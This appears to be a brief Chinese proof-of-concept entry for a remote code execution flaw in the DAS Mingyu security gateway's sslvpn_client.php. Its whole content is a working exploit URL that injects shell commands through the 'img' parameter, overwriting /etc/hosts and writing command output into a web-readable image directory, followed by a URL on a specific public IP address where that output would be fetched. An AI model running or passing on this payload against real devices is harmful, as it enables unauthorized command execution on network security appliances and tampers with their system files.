# 安恒明御安全网关 sslvpn_client.php 远程代码执行漏洞

    ## poc

```
https://localhost/sslvpn/sslvpn_client.php?client=logoImg&img=6drcdfs34c1h /tmp || ls |tee /etc/hosts /usr/local/webui/webui/images/basic/login/main_logo21.txt || ls
```



http://221.224.214.186:5555/webui/images/basic/login/main_logo21.txt
